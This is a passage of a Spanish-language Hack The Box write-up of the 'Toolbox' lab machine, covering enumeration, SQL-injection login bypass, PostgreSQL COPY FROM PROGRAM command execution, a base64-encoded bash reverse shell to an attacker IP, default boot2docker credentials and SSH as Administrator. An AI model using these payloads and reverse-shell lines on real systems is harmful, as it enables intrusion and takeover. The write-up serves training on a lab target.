</span></span><span class=line><span class=cl>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Not Found
</span></span><span class=line><span class=cl>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Not Found
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class=line><span class=cl>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49665/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49666/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49668/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49669/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>Service Info: OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2023-10-29T20:34:08
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   3:1:1: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled but not required
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: 1s
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><table><thead><tr><th style=text-align:center>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td style=text-align:center>-p</td><td>Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior</td></tr><tr><td style=text-align:center>-sC</td><td>Para que realice scripts básicos de reconocimiento</td></tr><tr><td style=text-align:center>-sV</td><td>Proporciona la versión e información de los servicios que corren por los puertos</td></tr></tbody></table></details><br><h3 id=ftp>FTP<a href=#ftp class=anchor aria-hidden=true>#</a></h3><p>Nmap a reportada que en el puerto 21 (FTP) está el login Anonymous habilitado. Esto significa que podemos entrar con el usuario anonymous sin necesidad de proporcionar contraseña. Una vez conectados vemos un archivo llamado docker-toolbox.exe que de momento no podemos hacer nada con él, pero no lo olvidaremos 😉</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ftp 10.10.10.236
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Connected to 10.10.10.236.
</span></span><span class=line><span class=cl>Name <span class=o>(</span>10.10.10.236:d3b0o<span class=o>)</span>: anonymous
</span></span><span class=line><span class=cl><span class=m>331</span> Password required <span class=k>for</span> anonymous
</span></span><span class=line><span class=cl>Password: 
</span></span><span class=line><span class=cl><span class=m>230</span> Logged on
</span></span><span class=line><span class=cl>ftp&gt; ls
</span></span><span class=line><span class=cl>-r-xr-xr-x <span class=m>1</span> ftp ftp      <span class=m>242520560</span> Feb <span class=m>18</span>  <span class=m>2020</span> docker-toolbox.exe
</span></span></code></pre></div><h3 id=smb>SMB<a href=#smb class=anchor aria-hidden=true>#</a></h3><p>El nmap también reporto que había un smb corriendo en la máquina víctima. Con un crackmapexec vemos un poco más de información sobre la máquina víctima&mldr;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>crackmapexec smb 10.10.10.236
</span></span><span class=line><span class=cl>SMB         10.10.10.236    <span class=m>445</span>    TOOLBOX          <span class=o>[</span>*<span class=o>]</span> Windows 10.0 Build <span class=m>17763</span> x64 <span class=o>(</span>name:TOOLBOX<span class=o>)</span> <span class=o>(</span>domain:Toolbox<span class=o>)</span> <span class=o>(</span>signing:False<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
</span></span></code></pre></div><p>Ahora podríamos probar de listar los recursos compartidos en el smb para ello vamos a usar distintas herramientas, pero no tenemos permisos para enumerar los recursos así que no podemos tirar por aquí tampoco</p><nav><div class="nav nav-tabs" id=nav-tab role=tablist><button data-toggle-tab=smbclient class="nav-link active" id=tabs-enum-shares-0-tab data-bs-toggle=tab data-bs-target=#tabs-enum-shares-0 type=button role=tab aria-controls=tabs-enum-shares-0 aria-selected=true>
Smbclient</button>
<button data-toggle-tab=crackmapexec class=nav-link id=tabs-enum-shares-1-tab data-bs-toggle=tab data-bs-target=#tabs-enum-shares-1 type=button role=tab aria-controls=tabs-enum-shares-1 aria-selected=true>
Crackmapexec</button>
<button data-toggle-tab=smbmap class=nav-link id=tabs-enum-shares-2-tab data-bs-toggle=tab data-bs-target=#tabs-enum-shares-2 type=button role=tab aria-controls=tabs-enum-shares-2 aria-selected=true>
Smbmap</button></div></nav><div class=tab-content id=nav-tabContent><div data-pane=smbclient class="tab-pane fade show active" id=tabs-enum-shares-0 role=tabpanel aria-labelledby=tabs-enum-shares-0-tab tabindex=0><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ smbclient -L 10.10.10.236 -N
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>session setup failed: NT_STATUS_ACCESS_DENIED
</span></span></code></pre></div></div><div data-pane=crackmapexec class="tab-pane fade" id=tabs-enum-shares-1 role=tabpanel aria-labelledby=tabs-enum-shares-1-tab tabindex=0><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ crackmapexec smb 10.10.10.236 -u <span class=s1>&#39;&#39;</span> -p <span class=s1>&#39;&#39;</span> --shares
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SMB         10.10.10.236    <span class=m>445</span>    TOOLBOX          <span class=o>[</span>*<span class=o>]</span> Windows 10.0 Build <span class=m>17763</span> x64 <span class=o>(</span>name:TOOLBOX<span class=o>)</span> <span class=o>(</span>domain:Toolbox<span class=o>)</span> <span class=o>(</span>signing:False<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.10.236    <span class=m>445</span>    TOOLBOX          <span class=o>[</span>-<span class=o>]</span> Toolbox<span class=se>\:</span> STATUS_ACCESS_DENIED 
</span></span><span class=line><span class=cl>SMB         10.10.10.236    <span class=m>445</span>    TOOLBOX          <span class=o>[</span>-<span class=o>]</span> Error enumerating shares: Error occurs <span class=k>while</span> reading from remote<span class=o>(</span>104<span class=o>)</span>
</span></span></code></pre></div></div><div data-pane=smbmap class="tab-pane fade" id=tabs-enum-shares-2 role=tabpanel aria-labelledby=tabs-enum-shares-2-tab tabindex=0><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ smbmap -H 10.10.10.236
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    ________  ___      ___  _______   ___      ___       __         _______
</span></span><span class=line><span class=cl>   /<span class=s2>&#34;       )|&#34;</span>  <span class=se>\ </span>   /<span class=s2>&#34;  ||   _  &#34;</span><span class=se>\ </span><span class=p>|</span><span class=s2>&#34;  \    /&#34;</span>  <span class=p>|</span>     /<span class=s2>&#34;&#34;</span><span class=se>\ </span>      <span class=p>|</span>   __ <span class=s2>&#34;\
</span></span></span><span class=line><span class=cl><span class=s2>  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
</span></span></span><span class=line><span class=cl><span class=s2>   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/
</span></span></span><span class=line><span class=cl><span class=s2>    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /
</span></span></span><span class=line><span class=cl><span class=s2>   /&#34;</span> <span class=se>\ </span>  :<span class=o>)</span> <span class=p>|</span>.  <span class=se>\ </span>   /:  <span class=o>||</span>: <span class=p>|</span>_<span class=o>)</span>  :<span class=o>)</span><span class=p>|</span>.  <span class=se>\ </span>   /:  <span class=p>|</span> /   /  <span class=se>\ </span>  <span class=se>\ </span> /<span class=p>|</span>__/ <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  <span class=o>(</span>_______/  <span class=p>|</span>___<span class=p>|</span><span class=se>\_</span>_/<span class=p>|</span>___<span class=p>|</span><span class=o>(</span>_______/ <span class=p>|</span>___<span class=p>|</span><span class=se>\_</span>_/<span class=p>|</span>___<span class=p>|</span><span class=o>(</span>___/    <span class=se>\_</span>__<span class=o>)(</span>_______<span class=o>)</span>
</span></span><span class=line><span class=cl> -----------------------------------------------------------------------------
</span></span><span class=line><span class=cl>     SMBMap - Samba Share Enumerator <span class=p>|</span> Shawn Evans - ShawnDEvans@gmail.com
</span></span><span class=line><span class=cl>                     https://github.com/ShawnDEvans/smbmap
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Detected <span class=m>1</span> hosts serving SMB
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Established <span class=m>0</span> SMB session<span class=o>(</span>s<span class=o>)</span> 
</span></span></code></pre></div></div></div><br><h3 id=https>HTTPS<a href=#https class=anchor aria-hidden=true>#</a></h3><p>Volviendo al escaneo de nmap, hay una línea en el resultado del puerto 443 que dice lo siguiente</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>admin.megalogistic.com/organizationName<span class=o>=</span>MegaLogistic Ltd/stateOrProvinceName<span class=o>=</span>Some-State/countryName<span class=o>=</span>GR
</span></span></code></pre></div><p>Así que vamos a añadir este dominio en el <code>/etc/hosts</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>10.10.10.236 megalogistic.com admin.megalogistic.com
</span></span></code></pre></div><p>En la web <strong>admin.megalogistic.com</strong> vemos un panel de login. Al probar la tipica inyección sql <code>' or 1=1-- -</code> en el campo del usuario vemos que podemos iniciar sesión satisfactoriamente. En la web no podemos sacar mucha información, simplemente podemos ver el desarrollador y la versión (MegaCorp 1.0.0) y un to-do que dice lo siguiente:</p><ul><li>Enviar credenciales a Tony</li><li>Actualizar los drivers de la impresora</li></ul><h2 id=intrusión>Intrusión<a href=#intrusión class=anchor aria-hidden=true>#</a></h2><p>En el panel anterior se pueden probar más cositas, de momento solo hemos probado de iniciar sesión con el <code>'or 1=1-- -</code>, pero a lo mejor podemos hacer más cositas.</p><p>Empezamos poniendo una comilla para ver si sale algún error legible de la base de datos.</p><pre tabindex=0><code>Warning: pg_query(): Query failed: ERROR: unterminated quoted string at or near &#34;&#39;&#39;&#39; AND password = md5(&#39;&#39;);&#34; LINE 1: SELECT * FROM users WHERE username = &#39;&#39;&#39; AND password = md5(... ^ in /var/www/admin/index.php on line 10

Warning: pg_num_rows() expects parameter 1 to be resource, bool given in /var/www/admin/index.php on line 11
</code></pre><p>Efectivamente, sale un error en el cual sale <code>pg_query()</code> con esto sabemos que estamos ante un <strong>PostgreSQL</strong></p><p>Para saber como hacer una inyección a un <strong>PostgreSQL</strong> existe un recurso muy interesante de la repo de <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution><strong>Payloads All The Things</strong></a>, en el cual se menciona una vulnerabilidad interesante que consiste en derivar la inyección sql a un rce (Remote Code Execution)</p><p>Básicamente, consiste en crear una tabla en la base de datos en uso por la web</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=n>cmd_exec</span><span class=p>(</span><span class=n>cmd_output</span><span class=w> </span><span class=nb>text</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></div><p>Mediante COPY se pondrá en la tabla el resultado del comando <code>id</code>, lo que provocará que se ejecute el comando <code>ìd</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>COPY</span><span class=w> </span><span class=n>cmd_exec</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>PROGRAM</span><span class=w> </span><span class=s1>&#39;id&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p>De forma opcional, en el caso de que podamos ver el output lo podríamos ver simplemente haciendo una petición a la tabla cmd_exec</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>cmd_exec</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p>Sabiendo esto vamos con la explotación:</p><p>Primero se intercepta la petición con burpsuite y la mandamos al repeter para trabajar mejor. En el apartado username vamos a añadir una comilla para cerrar la del username y despues vamos a poner un <code>;</code> para hacer otra petición. Ahora ya podemos poner la petición que realizara la inyección <code>CREATE TABLE cmd_exec(cmd_output text);</code>. Por último al final se comenta con un <code>-- -</code> para que ignore la siguiente parte de la querry de verificación de la password (Si esto no te queda claro tengo un video en mi canal de youtube en el cual explico en 6 minutos como funcionan las inyecciones sql)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>username</span><span class=o>=</span><span class=err>&#39;</span><span class=p>;</span>+CREATE+TABLE+cmd_exec<span class=o>(</span>cmd_output text<span class=o>)</span>-- -
</span></span></code></pre></div><p>Ahora ya tenemos la tabla cmd_exec creada</p><h3 id=reverse-shell>Reverse Shell<a href=#reverse-shell class=anchor aria-hidden=true>#</a></h3><p>Sabiendo que la máquina es windows si queremos mandarnos una reverse shell tenemos que compartir con un samba el ejecutable de netcat (nc.exe). Si estás desde un kali o parrot seguramente ya lo tendrás instalado lo puedes encontrar con un <code>locate nc.exe</code>. Ahora, ya desde el mismo directorio que tenemos el nc.exe podemos abrir el servidor samba de la siguiente forma:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>impacket-smbserver smb <span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span> --smb2support
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><ul><li><strong>${pwd}</strong>: Esto equivale a poner la ruta actual de trabajo, en este comando nos sirve para decir donde queremos que abra el servidor samba</li><li><strong>&ndash;smb2support</strong>: Sirve para habilitar el soporte de la versión 2 de samba</li></ul></details><br><p>Ahora nos ponemos en escucha por el puerto 443 para recibir la reverse shell</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -nlvp <span class=m>443</span>
</span></span></code></pre></div><details><summary>Explicación parámetros</summary><ul><li><strong>n</strong>: Sirve para que no haga la resolución de DNS</li><li><strong>l</strong>: Habilitar modo escucha de netcat</li><li><strong>v</strong>: Verbose, modo detallado de netcat</li><li><strong>p</strong>: Por último la p sirve para especificar el número de puerto en el cual vamos a estar en escucha</li></ul></details><br><p>Teniendo el servidor samba abierto y estando en escucha ya podemos mandar la reverse shell mediante la inyección sql.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>username</span><span class=o>=</span><span class=s1>&#39;;+COPY+cmd_exec+FROM+PROGRAM+&#39;</span>//10.10.14.28/nc.exe+-e+cmd.exe+10.10.14.28+443<span class=err>&#39;</span>-- -<span class=p>&amp;</span><span class=nv>password</span><span class=o>=</span><span class=nb>test</span>
</span></span></code></pre></div><p>No recibimos nada&mldr;</p><p>A lo mejor, por mucho que la máquina sea windows tiene un docker así que podemos probar de en vez de mandar la reverseshell con un netcat en un samba, mandarla directamente con bash</p><p>La típica reverse shell de bash es: <code>bash -i >& /dev/tcp/10.10.14.28/443 0>&amp;1</code>, pero lo pondremos dentro de <code>bash -c "bash- i..."</code> porque puede ser que la normal la bloquee la máquina víctima. En resumen quedará así:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash -c <span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.28/443 0&gt;&amp;1&#34;</span>
</span></span></code></pre></div><p>Antes de aplicarlo a la inyección vamos a convertirlo en base64 para evitar que los caracteres especiales den problemas.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.28/443 0&gt;&amp;1&#34;&#39;</span> <span class=p>|</span> base64
</span></span></code></pre></div><p>Ahora ya tenemos el base64 generado, pero hay un <code>+</code> en la cadena, el cual podemos sustituir por un <code>%2b</code>.
El comando final que tendremos que poner en la inyección seria, primero un echo con el base64, después un <code>base64 -d</code> para decodear el base64 y por último <code>bash</code> para que el resultado del base64 lo ejecute con bash.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;YmFzaCAtYyAiYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK&#34;</span> <span class=p>|</span> base64 -d <span class=p>|</span> bash
</span></span></code></pre></div><p>Esto aplicado a la inyección se vería de la siguiente forma:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>username</span><span class=o>=</span><span class=s1>&#39;;+COPY+cmd_exec+FROM+PROGRAM+&#39;</span>echo+<span class=s2>&#34;YmFzaCAtYyAiYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK&#34;</span>+<span class=p>|</span>+base64+-d+<span class=p>|</span>+bash<span class=err>&#39;</span>--+-
</span></span></code></pre></div><p>¡¡¡¡Recibimos la conexión!!!!!</p><p>Antes de la escalada, vamos a hacer un tratamiento de la tty para poder ejecutar <code>ctr + c</code>, <code>ctrl + l</code>, nano&mldr;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>script /dev/null -c bash
</span></span></code></pre></div><p>ctrl + z</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>stty raw -echo<span class=p>;</span> <span class=nb>fg</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>reset
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>xterm
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>SHELL</span><span class=o>=</span>bash
</span></span></code></pre></div><h2 id=escalada-de-privilegios>Escalada de privilegios<a href=#escalada-de-privilegios class=anchor aria-hidden=true>#</a></h2><p>Podemos identificar que estamos en un docker porque en la raíz está el archivo <code>.dockerenv</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>postgres@bc56e3cc55e9:/$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>80</span>
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>1</span> root root <span class=m>4096</span> Mar <span class=m>29</span>  <span class=m>2021</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>1</span> root root <span class=m>4096</span> Mar <span class=m>29</span>  <span class=m>2021</span> ..
</span></span><span class=line><span class=cl>-rwxr-xr-x   <span class=m>1</span> root root    <span class=m>0</span> Mar <span class=m>29</span>  <span class=m>2021</span> .dockerenv
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>1</span> root root <span class=m>4096</span> Feb <span class=m>19</span>  <span class=m>2020</span> bin
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root <span class=m>4096</span> Nov <span class=m>10</span>  <span class=m>2019</span> boot
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>5</span> root root  <span class=m>340</span> Oct <span class=m>30</span> 20:54 dev
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>Si hacemos una búsqueda por google podemos encontrar unas credenciales por default del ssh en los boot2docker (<a href=https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password>web</a>)</p><ul><li>user: docker</li><li>pass: tcuser</li></ul><p>Si miramos que ip tenemos con ifconfig, vemos la 172.17.0.2, la gateway seguramente será la 172.17.0.1</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ifconfig
</span></span><span class=line><span class=cl>eth0: <span class=nv>flags</span><span class=o>=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class=m>1500</span>
</span></span><span class=line><span class=cl>        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
</span></span><span class=line><span class=cl>        ether 02:42:ac:11:00:02  txqueuelen <span class=m>0</span>  <span class=o>(</span>Ethernet<span class=o>)</span>
</span></span><span class=line><span class=cl>        RX packets <span class=m>1338</span>  bytes <span class=m>183525</span> <span class=o>(</span>179.2 KiB<span class=o>)</span>
</span></span><span class=line><span class=cl>        RX errors <span class=m>0</span>  dropped <span class=m>0</span>  overruns <span class=m>0</span>  frame <span class=m>0</span>
</span></span><span class=line><span class=cl>        TX packets <span class=m>1163</span>  bytes <span class=m>173814</span> <span class=o>(</span>169.7 KiB<span class=o>)</span>
</span></span><span class=line><span class=cl>        TX errors <span class=m>0</span>  dropped <span class=m>0</span> overruns <span class=m>0</span>  carrier <span class=m>0</span>  collisions <span class=m>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>lo: <span class=nv>flags</span><span class=o>=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class=m>65536</span>
</span></span><span class=line><span class=cl>        inet 127.0.0.1  netmask 255.0.0.0
</span></span><span class=line><span class=cl>        loop  txqueuelen <span class=m>1000</span>  <span class=o>(</span>Local Loopback<span class=o>)</span>
</span></span><span class=line><span class=cl>        RX packets <span class=m>3461</span>  bytes <span class=m>1232799</span> <span class=o>(</span>1.1 MiB<span class=o>)</span>
</span></span><span class=line><span class=cl>        RX errors <span class=m>0</span>  dropped <span class=m>0</span>  overruns <span class=m>0</span>  frame <span class=m>0</span>
</span></span><span class=line><span class=cl>        TX packets <span class=m>3461</span>  bytes <span class=m>1232799</span> <span class=o>(</span>1.1 MiB<span class=o>)</span>
</span></span><span class=line><span class=cl>        TX errors <span class=m>0</span>  dropped <span class=m>0</span> overruns <span class=m>0</span>  carrier <span class=m>0</span>  collisions <span class=m>0</span>
</span></span></code></pre></div><p>Así que nos podemos conectar a la máquina host del docker con <code>ssh docker@172.17.0.1</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ssh docker@172.17.0.1
</span></span><span class=line><span class=cl>docker@172.17.0.1<span class=s1>&#39;s password: 
</span></span></span><span class=line><span class=cl><span class=s1>   ( &#39;</span>&gt;<span class=err>&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>  /<span class=o>)</span> TC <span class=o>(</span><span class=se>\ </span>  Core is distributed with ABSOLUTELY NO WARRANTY.
</span></span><span class=line><span class=cl> <span class=o>(</span>/-_--_-<span class=se>\)</span>           www.tinycorelinux.net
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>docker@box:~$ 
</span></span></code></pre></div><h3 id=escalada-rootadministrator>Escalada root/Administrator<a href=#escalada-rootadministrator class=anchor aria-hidden=true>#</a></h3><p>Si hacemos un sudo -l para ver que podemos ejecutar con sudo, nos muestra que podemos ejecutar todos los comandos como root sin la necesidad de proporcionar contraseña.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docker@box:~$ sudo -l
</span></span><span class=line><span class=cl>User docker may run the following commands on this host:
</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> NOPASSWD: ALL
</span></span><span class=line><span class=cl>docker@box:~$ 
</span></span></code></pre></div><p>Sabiendo esto simplemente podemos poner <code>sudo bash</code> y ya seremos root</p><pre tabindex=0><code>docker@box:~$ sudo bash
root@box:/home/docker#
</code></pre><p>Al investigar un poco los archivo de la raíz se puede ver que hay un directorio llamado <code>c</code> en el cual hay una estructura de carpetas parecida a la de windows, ahí podemos encontrar la flag final</p><pre tabindex=0><code>root@box:/c/Users/Administrator/Desktop# ls                                    
desktop.ini  root.txt
root@box:/c/Users/Administrator/Desktop#
</code></pre><p>Y ya tendríamos la flag de root.txt</p><p>Como extra, en el directorio <code>/c/Windows/Users/.ssh</code> podemos ver una llave privada de ssh la cual podemos usar para salir del docker e ir a la máquina host. Para usarla tenemos que guardarla en un archivo en nuestra máquina</p><p>Para que no de problemas le tenemos que dar permisos</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>chmod <span class=m>600</span> id_rsa
</span></span></code></pre></div><p>Ahora ya nos podemos conectar por ssh como Administrator en la máquina víctima con el siguiente comando</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh -i id_rsa Administrator@10.10.10.236
</span></span></code></pre></div><p>Y ya tenemos una consola como Administrator en la máquina víctima</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ssh -i id_rsa Administrator@10.10.10.236
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>administrator@TOOLBOX C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator&gt;
</span></span></code></pre></div><div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between"></div><div class="page-nav d-flex flex-column flex-sm-row"><div class="card w-100"><div class="card-body d-flex"><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M5 12l6 6"/><path d="M5 12l6-6"/></svg></div><div class="d-flex flex-column"><div class=text-body-secondary>Prev</div><a href=/writeups/hackthebox/jupiter/ class="stretched-link text-reset text-decoration-none">Jupiter</a></div></div></div><div class=m-2></div><div class="card text-end w-100"><div class="card-body d-flex justify-content-end"><div class="d-flex flex-column"><div class=text-body-secondary>Next</div><a href=/writeups/hackthebox/pandora-video/ class="stretched-link text-reset text-decoration-none">Pandora (Video)</a></div><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M13 18l6-6"/><path d="M13 6l6 6"/></svg></div></div></div></div></main></div></div></div><footer class="footer text-muted"><div class=container-lg><div class=row><div class="col-lg-8 text-center text-lg-start"><ul class=list-inline><li class=list-inline-item><a class=text-muted href=/tags/>Tags</a></li></ul></div><div class="col-lg-8 text-center text-lg-end"><ul class=list-inline><li class=list-inline-item>Brought to you by <a class=text-muted href=https://gethyas.com/>Hyas</a></li></ul></div></div></div></footer><script async src=/js/app.1e84dcdaa5ccef6fe83f6d88ac1e444a1f237111cfa2a7a97427f758e9c27ef4.js integrity="sha256-HoTc2qXM72/oP22IrB5ESh8jcRHPoqepdCf3WOnCfvQ="></script><script async src=/js/flexsearch.78e4b7a9456a2770bd6faffb1f6488b30db12ca157c3df4e89e3ae2e258888ae.js integrity="sha256-eOS3qUVqJ3C9b6/7H2SIsw2xLKFXw99OieOuLiWIiK4="></script><script async src=/js/search-modal.c4c023efcdee308e4b5f1110afe1db6b1656f217e67aa7efe54e2f4bf2feccf8.js integrity="sha256-xMAj783uMI5LXxEQr+HbaxZW8hfmeqfv5U4vS/L+zPg="></script><div class="d-inline-flex fixed-bottom-right pb-4 pe-4"><button id=toTop type=button class="btn btn-primary rounded-circle ms-auto p-2"><span class=visually-hidden>Top</span><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-up" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 15l6-6 6 6"/></svg></button></div></body></html>